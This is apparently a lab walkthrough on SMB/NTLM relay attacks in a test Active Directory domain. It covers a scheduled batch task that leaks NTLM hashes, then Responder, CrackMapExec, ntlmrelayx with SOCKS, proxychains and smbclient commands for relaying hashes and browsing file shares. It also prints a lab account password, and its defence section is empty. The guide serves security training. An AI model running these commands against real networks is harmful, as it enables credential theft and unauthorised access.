# SMB Relaying

## Configuring

Login to WS01 with an account, which has administrator privileges. In our example, we use the domain Administrator of AMSTERDAM.

With this attack we need some kind of 'user behaviour', so simulate this we're going to make use of a 'scheduled task' which is running a batch file every 5 minutes. Within the batch file we need to simulate that an user is going to a wrong share within the network. Inside the batch file is the following code:

```
@ECHO OFF
SETLOCAL ENABLEEXTENSIONS
SET BaseRange=192.168.248
SET Min=1
SET Max=25
SET Counter=0

FOR /L %%A in (%Min%,1,%MAX%) DO (
ECHO Downloading Backup %BaseRange%.%%A
copy \\%BaseRange%.%%A\laptop_data c:\users\pukcab\documents\old_data >nul 2>&1 &&SET /A Counter+=1
)
```

`SET BaseRange` is the IP-range where our kali machine is located. `Set Min` and `set Max`, is the specific host within this ip-range. Our kali machine is located within the IP-range `192.168.248.1` through `192.168.248.25`

The for loop is going to loop through the IP-range and tries to 'copy' a file from a non-existing share. This will result in leaking the NTLM-hash.

We need to save this file to a location accessible for the user who's going to run the bat-file. In our example the user who's going to run the scheduled task is `pukcab`. We have put the file inside the documents folder.

{% hint style="info" %}
The range in our ESXI lab for our kali machines is different because we get access by VPN. For recreating the lab the following settings should be used:

```
SET BaseRange=10.0.0
SET Min=128
SET Max=150
```
{% endhint %}

#### Creating a scheduled task

1\. Open up 'Task Scheduler'.

![](<../../.gitbook/assets/afbeelding (29) (1) (1).png>)

2\. Select "Task Scheduler Library" and click "create a new task".

![](<../../.gitbook/assets/afbeelding (26) (1) (1).png>)

3\. In the "General" tab, select "Run whetever user is logged on or not". Also we need to change the user, this can be done by clicking on "Change User..." and login with the user we have created for this attack, in our case `pukcab:Bangbang123` .

![](<../../.gitbook/assets/afbeelding (9) (1).png>)

4\. At the 'Triggers' tab, click on "New...". Within the new tab, set 'Begin the task:' on "At startup". Check "Repeat task every:" and set the value "5 minutes" and set 'for a duration of:' to "indefinitely".

![](<../../.gitbook/assets/afbeelding (4).png>)

5\. In the "Actions" tab click on "New..." and browse to your .bat file and click on "OK". You should have about the same as us:

![](<../../.gitbook/assets/afbeelding (6) (1).png>)

6\. Conditions doesn't need any change, so we can go to the last tab called "Settings". Within "Settings" the only thing we need to change is "Do not start a new instance" to "Run a new instance in parallel".

![](../../.gitbook/assets/afbeelding.png)

7\. Click on "OK" and fill in the credentials of the user. After we restart our workstation, the scheduled task will run every 5 minutes.

## Attacking

### How it works

If an attacker has access to a network, which is also used by people inside the company. The attacker can listen to traffic and reply to it. The traffic can contain Net-NTLM-hashes.

When a person wants access to a network device, like a file storage, Net-NTLM-hashes are sent to the device. The Net-NTLM-hash is sent to let the network-device know, who's connecting to it.&#x20;

But, why is an attacker intercepting the Net-NTLM-hash? Sometimes it can happen, that an old shortcut is still in use. But the shortcut points to an old server. The user doesn't even need to click the shortcut, but when an user opens the file explorer and the shortcut is there, Windows will automatically load it.

An attacker can take advantage of this and place on every network device he has access to, a shortcut, which points to his machine. During the configuration phase, we've created an user, who's trying to connect to an old Windows server, to store his files.

### Tools

* [Responder](https://github.com/lgandx/Responder)
* CrackMapExec
* [Impacket-ntlmrelayx](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py)
* smbclient
* proxychains

### Executing the attack

1. First we will run Responder, to look for traffic within our network. If we notice an user is active, we will try to relay the Net-NTLM-hash. The command we will run, to look passively:

```
sudo responder -I tun0 -A
```

{% hint style="info" %}
Our interface is tun0, this is because we're connected to a VPN.
{% endhint %}

After a few minutes you notice a NTLMv2-SSP hash from the user pukcab:

![](<../../.gitbook/assets/image (73) (1) (1).png>)

2\. We can try to crack the NTLMv2 hash or relay the hash to Windows machines, which has SMB signing on false. In this example we will try to relay the hash. More information about cracking hashes, can be found [here](../../lab-setup/to-do.md).

For relaying hashes we're going to use a package of impacket, called ntlmrelayx. But before we're going to use ntlmrelayx, we need to know which host has SMB signing on false. For this we use CrackMapExec. To view manually which hosts in a specific subnet has SMB signing on false, we will run the following command:

```
crackmapexec smb 10.0.0.0/24
```

![In the end you notice (signing:False)](<../../.gitbook/assets/image (28) (1).png>)

3\. CracMapExec also has a function to generate a list of hosts, which has SMB signing on false. To create this list, you need to run the following command:

```
crackmapexec smb 10.0.0.0/24 --gen-relay-list smb-signing-false.txt
```

4\. The generated list we can use with the tool ntlmrelayx. The below command, will try to authenticate with the Net-NTLM-hash and try to dump the Sam. Dumping the Sam is only possible, when you have administrator access to the machine.

```
sudo ntlmrelayx.py -tf smb-signing-false.txt -smb2support
```

Within some minutes we see something happening within ntlmrelayx, it's trying to relay the hash to the hosts which are inside our .txt. We notice it succeeded two times to authenticate, but access is denied after.

![](<../../.gitbook/assets/image (74).png>)

5\. So, what can we do after this attempt has failed? We can try to the socks parameter within ntlmrelayx. The socks parameter, will try to authenticate and remember the connection in the background. The command we will run is as follows:

```
sudo ntlmrelayx.py -tf smb-signing-false.txt -smb2support -socks
```

After a few minutes, we get new output within ntlmrelayx. But this time, we see _adding user to active SOCKS connection. Enjoy._ This means, we have an active connection to two machines.

![](<../../.gitbook/assets/image (19) (1).png>)

We can verify our connection by pressing enter until we see _ntlmrelayx>_ . Now we can type _socks_ and we see the machines, where we have succesfully relayed our hashes to.

![](<../../.gitbook/assets/image (58).png>)

5\. Now we need to use the active socks connections we have, for this we will use _proxychains._ Before using proxychains, we need to make some changes within proxychains. This can be done through editor, the file we need to change is `/etc/proxychains4.conf` _._

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks5 	127.0.0.1 9000
socks4 		127.0.0.1 1080
```

At the bottom we need to add socks 4, with port 1080. And remove other socks. With the changes made, we can use our active socks connections through proxychains.

6\. We want to know if our user has access to certain folders. To check this, we will use CrackMapExec with the parameter --shares. The command is as follows:

```
proxychains crackmapexec smb smb-signing-false.txt -d amsterdam -u pukcab -H 00000000000000000000000000000000 --shares
```

At the -H we can fill in a random hash, this is because CrackMapExec will use our hash from ntlmrelayx.&#x20;

![](<../../.gitbook/assets/image (42).png>)

7\. We notice that our user _pukcab_ has access to the Data directory at FILE01. To view what's inside this directory, we can use smbclient. Smbclient is also a package from impacket. The command we will run to view the content of the Data directory, is as follows:

```
proxychains smbclient.py AMSTERDAM/pukcab:this_password_can_be_empy_aswell@10.0.0.4
```

With above command, we get a connection to FILE01. If we type `shares`, the shares from above image will show. Next we type `use Data` and `ls`. After we have typed those commands, more directories will show up. With the command `cd directory_name`, you can change to the directory you want.

In this example, we notice a file called credentials.txt inside the backup directory.



## Defending

### Recommendations



### Detection





## References

{% embed url="https://infosecwriteups.com/abusing-ntlm-relay-and-pass-the-hash-for-admin-d24d0f12bea0" %}
